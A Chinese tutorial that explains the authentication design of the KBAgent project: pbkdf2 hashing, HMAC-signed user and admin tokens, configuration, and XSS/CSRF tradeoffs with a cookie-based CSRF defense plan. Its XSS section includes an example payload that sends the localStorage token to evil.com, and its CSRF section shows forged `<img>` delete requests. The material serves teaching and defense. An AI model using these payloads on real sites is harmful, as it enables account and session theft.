# 登录与鉴权详解（从零讲起）

> 这份文档面向"没接触过鉴权"的读者，把 KBAgent 里的登录/身份机制讲透：
> 为什么需要它、token 是什么、密码怎么存、HMAC 签名为什么能防伪造，
> 以及用户端和管理端两套身份体系的完整流程示例。

---

## 1. 为什么需要登录/鉴权

先看没有鉴权会怎样（本项目修过的问题）：

```text
没有鉴权的用户端：
  任何人把请求体里的 user_id 改成别人的 id
  → 读到别人的对话记忆、以别人身份提问 → 隐私事故

没有鉴权的管理端（历史版本就是如此）：
  任何人调用 /api/admin/documents/{id} DELETE
  → 直接删除知识库文档、改配置 → 数据事故
```

**鉴权回答"你是谁"，授权回答"你能干什么"**。本项目先做鉴权
（确认身份可信），再做最小授权（管理端只有管理员能用）。

---

## 2. 先搞懂四个基础概念

### 2.1 密码不能存明文

如果数据库/配置文件泄露，明文密码直接暴露，用户在其他网站也用同一密码就一起
遭殃。正确做法是存**密码哈希**：把密码做一次不可逆的运算再存。

本项目用 **pbkdf2**（加盐 + 迭代哈希）：

```text
hash_password("admin123")
→ "pbkdf2$100000$a1b2c3d4e5f6...$9f86d081884c7d659a2f..."
  格式：pbkdf2$迭代次数$随机盐$哈希值
```

验证时用同样的盐和迭代次数重算再比较，**盐是随机**的，所以相同密码每次哈希
结果都不同，攻击者无法用彩虹表反推。比较用恒定时间函数（`hmac.compare_digest`），
防止"比较快慢泄露密码长度"这类时序攻击。

### 2.2 token 是什么

登录成功后，服务端发给客户端一个**通行证字符串**（token）。客户端把它存起来
（本项目存 localStorage），后续请求带上它，就不用每次输密码。

为什么不用"每次都传用户名密码"：

1. 密码不该在网络上反复传输（抓包风险）
2. 服务端每次查库比对密码太慢、太频
3. token 可以单独设置过期时间，泄露了也会自动失效

### 2.3 HMAC 签名为什么能防伪造

**HMAC 是什么**：全称 Hash-based Message Authentication Code（基于哈希的消息
认证码），简单说就是**"用密钥参与计算的哈希"**。它长这样：

```text
HMAC(密钥, 内容) → 一段固定长度的签名
```

先分清"普通哈希"和 HMAC 的区别（这是面试常考的点）：

| | 普通哈希（如直接 SHA-256） | HMAC（带密钥的哈希） |
|---|---|---|
| 计算 | SHA-256(内容) | HMAC(密钥, 内容) |
| 需要密钥吗 | 不需要 | 需要 |
| 谁能算 | 任何拿到内容的人都能算出一样的哈希 | 只有知道密钥的人能算出正确的签名 |
| 能防篡改吗 | 不能：攻击者改内容后自己重算哈希，照样对得上 | 能：攻击者改了内容但不知道密钥，算不出匹配签名 |

`SHA-256` 是其中用的哈希算法：把任意长度的输入变成固定 256 位（64 位十六进制）
的输出，**单向不可逆**（只能正着算，不能从哈希反推原文）。HMAC 的安全性来自
两点：密钥保密 + 哈希单向性。

**回到 token 防伪造**：token 不能是"客户端自己随便写的一段字符串"——否则人人
可以自称 admin。所以服务端用只有自己知道的**密钥**对内容做 HMAC-SHA256 运算，
得到签名拼在 token 末尾。客户端没有密钥，改任何内容都会导致签名对不上，
服务端验签直接拒绝。

```text
伪造尝试：token = user_attacker.abcdef...
服务端验签：用密钥对 "user_attacker" 重新算签名 → 和 token 里的 abcdef 不一致
→ 判定无效 → 当作新访客处理
```

### 2.4 过期时间

token 里带一个过期时间戳（exp），服务端验签时检查"当前时间是否已超过 exp"。
好处：token 即使被偷，也只能用有限时间；改密码/踢人时让旧 token 尽快失效。

---

## 3. 本项目两套身份体系

### 3.1 用户端：匿名身份 token（阶段 0）

**为什么是"匿名"**：项目没有账号注册体系，但"身份可信"和"身份实名"是两件事——
先让 user_id 由服务端签发（不可伪造），将来接账号体系时把匿名 id 换成登录后的
真实 id 即可。

**完整流程（带示例）**：

```text
第 1 步：用户首次发消息（不带任何身份）
  POST /chat  {"message": "你好", "session_id": "sess_abc"}

第 2 步：服务端发现没有有效 token → 签发一个匿名身份并随响应返回
  响应：
  {
    "reply": "你好！我是智能助手……",
    "session_id": "sess_abc",
    "token": "user_8969a39e1546.b97997ea2ee6a85f8e1a78d22cb183e4...",
    ...
  }
  （token = 服务端生成的 user_id + HMAC 签名）

第 3 步：前端把 token 存进 localStorage（key: smartsupport_token）

第 4 步：后续所有请求自动带上
  Authorization: Bearer user_8969a39e1546.b97997ea2ee6a85f8e1a78d22cb183e4...

第 5 步：服务端验签得到 user_id = user_8969a39e1546
  → 会话归属校验（sess_abc 属于这个用户才允许访问）
  → 记忆按这个 user_id 读写（别人改不了、看不到）
```

**边界**：匿名身份存在浏览器 localStorage，换设备/清缓存就丢了（变成新访客）；
这是"账号体系"之前的过渡方案。

### 3.2 管理端：用户名 + 密码登录（带过期 admin token）

**完整流程（带示例）**：

```text
第 1 步：管理员在登录页输入用户名密码
  POST /api/admin/login
  body: {"username": "admin", "password": "admin123"}

第 2 步：服务端校验（密码按 pbkdf2 哈希比对）
  成功 → 签发 admin token（默认 24 小时有效）：
  响应：
  {
    "token": "admin.1799999999.9f86d081884c7d659a2f...",
    "username": "admin",
    "expires_in": 86400
  }
  失败 → 401 {"detail": "用户名或密码错误"}

第 3 步：前端把 token 存进 localStorage（key: smartsupport_admin_token）

第 4 步：后续管理请求自动带上
  Authorization: Bearer admin.1799999999.9f86d081884c7d659a2f...

第 5 步：服务端验签 + 检查过期
  有效 → 放行（返回 {"admin": true, "username": "admin"}）
  无效/过期/未带 → 401，前端收到 401 自动清 token 跳回登录页
```

**token 结构说明**：

```text
admin.1799999999.9f86d081884c7d659a2f...
└─┬─┘ └───┬───┘ └──────────┬──────────┘
  前缀   过期时间戳          HMAC 签名（密钥 = ADMIN_TOKEN_SECRET）
```

---

## 4. 配置说明（.env）

```dotenv
# 用户端匿名 token 签名密钥（生产必须改成强随机值）
ANON_TOKEN_SECRET=please-change-me

# 管理端：管理员账号
ADMIN_USERNAME=admin
# 明文（开发用）或 pbkdf2 哈希（生产建议）
ADMIN_PASSWORD=admin123
# 管理 token 签名密钥（生产必须改成强随机值）
ADMIN_TOKEN_SECRET=please-change-me
# admin token 有效期（秒），默认 86400 = 24 小时
ADMIN_TOKEN_TTL_SECONDS=86400
```

生成 pbkdf2 哈希（生产用）：

```bash
python -c "from app.api.admin_auth import hash_password; print(hash_password('你的强密码'))"
```

把输出填到 `ADMIN_PASSWORD`。

---

## 5. 常见问题

**Q：为什么不用标准 JWT？**
本项目管理 token 是"简化版 JWT"：JWT 的 payload 是 base64 编码 + HMAC 签名，
本项目是"前缀.过期时间.签名"，原理完全一样。
（base64 是**编码不是加密**：可逆、任何人都能解码，所以 JWT/签名字段里
不能放敏感信息，防篡改靠的是后面的签名而不是 base64 本身。）
用 JWT 的好处是有标准库/生态（如 pyjwt），多平台验证方便；当前单服务自验证，
手写 HMAC 足够，也是面试讲原理的好素材。

**Q：token 存 localStorage 安全吗？**
localStorage 能被同源的 XSS 脚本读取，所以生产更安全的做法是 HttpOnly cookie
（JS 读不到）+ CSRF 防护。当前是"可用的最小方案"，文档如实标注边界。

展开解释三个概念：

**XSS（跨站脚本攻击）**：攻击者把恶意 JavaScript 注入页面执行，最常见是
"用户输入没过滤就渲染"。例如聊天框输入 `<img src=x onerror="fetch('https://
evil.com/?t='+localStorage.getItem('token'))">`，前端若当 HTML 渲染，
脚本就读走 localStorage 里的 token。localStorage 是给页面 JS 用的存储，
任何同源脚本都能读——所以"存 localStorage"的前提是"页面永远没有 XSS"。

**HttpOnly cookie**：cookie 的一个属性，本质是"浏览器替你保管并自动出示的
证件"。设置 `Set-Cookie: session=abc123; HttpOnly` 后：

- JavaScript 调 `document.cookie` **拿不到**它（XSS 脚本也读不到，token 不裸奔）
- 但浏览器发请求时**自动带上**它——注意"自动"是这里的关键：

```text
登录成功 → 服务器 Set-Cookie: session=abc123; Domain=example.com
浏览器记住：这张证属于 example.com

之后每次访问 example.com 的页面/接口：
  浏览器自动在请求头加 Cookie: session=abc123
  → 服务器认出"这是刚才登录的用户"（前端一行代码都不用写）

"发往 cookie 所属域名"：这张证有归属——浏览器只把它出示给 example.com 的请求，
发给 evil.com 的请求不带（不会把公司门禁卡刷到别人家门上）。
```

**为什么"自动带"同时带来 CSRF**：浏览器出示证件不看"请求是谁发的"，
只看"请求发往哪个域名"。攻击者在自己页面放
`<img src="http://example.com/api/admin/xxx/delete">`，用户一访问，
浏览器向 example.com 发出请求时照样自动带 `Cookie: session=abc123`，
服务器误以为是本人操作——这就是 CSRF 的来源。

**CSRF（跨站请求伪造）**：攻击者诱导用户在已登录网站执行非本意操作。因为
cookie 是"浏览器自动带上"的，攻击者在自己页面放 `<img src="http://你的网站
/api/admin/documents/xxx/delete">`，用户一访问，浏览器就带着你的 cookie 发出
这个请求，服务器误以为是本人操作。而 localStorage 方案不会自动带 token
（需要前端手动加 Authorization 头），所以天然不怕 CSRF。

| | localStorage + Authorization 头 | HttpOnly cookie |
|---|---|---|
| 怕 XSS 吗 | 怕（JS 能读到 token） | 不怕（JS 读不到） |
| 怕 CSRF 吗 | 不怕（token 不会自动带） | 怕（cookie 自动带，需 SameSite/CSRF Token 防护） |
| 本质 | 把风险押在"没有 XSS" | 把风险押在"有 CSRF 防护" |

所以两者是把风险从一处挪到另一处；生产更稳的组合是
HttpOnly cookie + SameSite + CSRF Token。

**落地实现（参考方案，当前项目尚未实施）**：

后端：token 改为下发到 HttpOnly cookie，而不是响应体 + localStorage。

```python
# 用户端：首次 /chat 签发匿名 token 时
response.set_cookie(
    key="kbagent_uid",
    value=token,
    httponly=True,     # JS 读不到（XSS 偷不走）
    samesite="lax",    # CSRF 第一道：跨站请求不带
    secure=os.getenv("COOKIE_SECURE", "false") == "true",  # 生产 https 才开
    max_age=86400,
)
# 管理端：/api/admin/login 同样 set_cookie("kbagent_admin", ...)

# 读取：身份解析优先从 request.cookies 读，Authorization 头保留兼容期
```

CSRF 防护三层（因为 cookie 自动带，必须做）。先理解攻击：cookie 是浏览器自动
带的，所以"带 cookie 的请求"只证明浏览器里登录过，没证明请求是你页面发的。
三层防护就是三个"必须是你页面才能提供"的证明：

**第 1 层：SameSite=Lax —— 让攻击请求带不上 cookie**

cookie 加 `SameSite=Lax` 后，浏览器只在同站请求、或跨站顶级导航 GET 时带它；
攻击者的 `<img>`/表单/自动 fetch 都是跨站非顶级请求 → 不带 cookie → 无身份。

```text
攻击请求：evil.com 页面发 example.com DELETE
浏览器判断：跨站、非顶级导航 → SameSite=Lax 生效 → 不带 cookie → 401 ❌
```

**第 2 层：自定义头校验 —— 攻击者伪造不了"你的页面特征"**

前端统一给请求加 `X-Requested-With: XMLHttpRequest`，服务端校验非 GET 请求
缺这个头就 403。`<img>`/`<form>` 只能设置标准字段、无法设置自定义头；
跨域 fetch 设置自定义头会触发 CORS 预检，预检不通过请求发不出去。

```text
攻击请求：<img src="example.com/delete"> → 无法带自定义头 → 403 ❌
```

**第 3 层：CSRF Token 双提交 —— 攻击者带得上 cookie，却填不对 token**

```text
登录时服务端：
  ① 生成随机值 csrf=9f8e7d...（放 cookie，这个 cookie 不设 HttpOnly，让前端 JS 能读）
  ② 同时把同值返回给前端（响应体）

前端发请求时：
  ① 浏览器自动带 Cookie: csrf=9f8e7d...（自动带 ✅）
  ② 前端 JS 读 cookie 值，放进请求头 X-CSRF-Token: 9f8e7d...（只有你的 JS 能做）
  ③ 服务端校验：头里的值 == cookie 里的值 → 一致才放行 ✅

攻击者页面发请求时：
  ① 浏览器自动带 Cookie: csrf=9f8e7d...（自动带 ✅ 它能带）
  ② 但攻击者 JS 跨域读不到你的 cookie（同源策略）→ 无法把头里的值填对
  ③ 服务端校验：头里值缺失/不对 vs cookie 里的 9f8e7d → 不一致 → 403 ❌
```

关键：cookie 是"自动带"（攻击者也有），请求头是"手动填"（只有你的 JS 能填）。
服务端要求两者一致，就把"自动带"和"手动填"绑在一起——攻击者只满足一半。

**三层叠加后的完整对比**：

```text
攻击者请求：① SameSite=Lax：跨站不带 cookie → 401
           ② 过了①？自定义头缺失 → 403
           ③ 过了②？CSRF Token 头填不对 → 403

正常请求：  ① 同站/顶级导航 → cookie 带上 ✅
           ② 前端统一加自定义头 ✅
           ③ 前端读 cookie 填对 CSRF Token ✅ → 放行
```

前端：移除 localStorage token 管理，axios 开启 withCredentials 并统一加校验头。

```js
const client = axios.create({
  baseURL: API_BASE_URL,
  withCredentials: true,  // 跨域也能带/收 cookie
});
client.interceptors.request.use((config) => {
  config.headers['X-Requested-With'] = 'XMLHttpRequest';  // CSRF 校验头
  return config;
});
```

CORS 必须收紧（`allow_origins=["*"]` 与 cookie 不兼容）：
改为具体域名 + `allow_credentials=True`，从 `CORS_ORIGINS` 环境变量读取。

代价与注意：SSE 流式请求也要带 cookie（fetch 加 `credentials: 'include'`）；
生产跨域部署（api 与前端不同域）需要 `SameSite=None; Secure` 或 nginx 同域反代。

**Q：为什么用户端不需要登录？**
因为还没有账号体系。匿名 token 保证"身份不可伪造"，配合会话归属校验保证
"看不到别人的数据"；等接入真实登录后，把匿名 user_id 替换成登录签发的真实
user_id 即可，其余逻辑不用动。

**Q：怎么验证管理端鉴权真的生效了？**
不带 token 调管理接口：

```text
curl http://127.0.0.1:8000/api/admin/documents
→ 401 {"detail": "未授权：请先通过 /api/admin/login 获取 admin token"}
```
